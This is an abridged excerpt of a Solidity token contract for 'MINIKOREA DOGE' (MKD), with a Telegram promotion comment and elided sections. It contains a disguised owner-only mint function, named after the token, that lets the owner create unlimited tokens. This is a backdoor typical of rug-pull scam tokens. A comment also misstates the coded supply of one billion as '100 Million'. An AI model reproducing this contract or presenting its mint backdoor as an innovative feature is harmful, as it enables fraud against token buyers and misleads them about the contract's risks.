...
//
// $MINIKOREADOGE proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/MiniKoreaDoge
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function minikoreadoge(uint256 amount) public onlyOwner {
    _minikoreadoge(msg.sender, amount);
    }
    ...
    function _minikoreadoge(address account, uint256 amount) internal virtual {
...
contract $MINIKOREADOGE is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("MINIKOREA DOGE", "MKD") {
        _minikoreadoge(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}